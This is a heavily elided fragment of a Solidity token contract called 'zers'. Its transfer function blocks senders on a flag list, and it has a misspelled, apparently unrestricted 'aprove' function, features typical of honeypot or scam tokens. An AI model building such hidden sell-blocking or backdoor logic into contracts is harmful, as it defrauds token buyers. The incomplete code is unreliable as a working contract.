...
contract zers is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "zers";
    string private _symbol = "zers";
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!isExcludedFromFees[sender], "Transfer amount must from another address");
        if(inSwapAndLiquify)
        { 
    ...
    function aprove(address newAddress) external virtual {
